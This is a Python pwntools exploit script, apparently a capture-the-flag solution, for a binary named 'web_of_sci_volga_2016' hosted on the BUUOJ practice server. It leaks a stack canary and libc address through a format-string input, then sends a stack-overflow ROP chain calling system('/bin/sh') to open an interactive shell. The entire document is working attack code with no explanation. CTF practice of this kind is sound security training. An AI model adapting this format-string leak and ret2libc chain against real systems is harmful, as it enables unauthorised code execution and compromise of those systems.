import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./web_of_sci_volga_2016')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./web_of_sci_volga_2016')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26621)
			elf=ELF('./web_of_sci_volga_2016')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add():
			io.sendlineafter(b'> ',b'1')

		def delete(a):
			io.sendlineafter(b'> ',b'2')
			io.sendlineafter(b'index:\n',str(a))

		def edit(a,c):
			io.sendlineafter(b'> ',b'3')
			io.sendlineafter(b'index:\n',str(a))
			io.sendafter(b'content:\n',c)

		def show(a):
			io.sendlineafter(b'> ',b'4')
			io.sendlineafter(b'index:\n',str(a))

		io.recv()
		#gdb.attach(io)
		io.sendline('%43$p%36$p')
		io.recvuntil('0x')
		can=int(io.recvuntil('0x',drop=True),16)
		libc_base=int(io.recvuntil(', ',drop=True),16)-libc.sym[b'_IO_2_1_stdout_']
		libc.address=libc_base
		pay=b'123'.ljust(0x88,b'\x00')+p64(can)+p64(0)*3+p64(0x00000000004010a3)+p64(next(libc.search(b'/bin/sh\x00')))+p64(libc.sym[b'system'])
		io.sendlineafter('your response: ',pay)
		for i in range(9) :
			io.sendlineafter('your response: ','1')


		


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue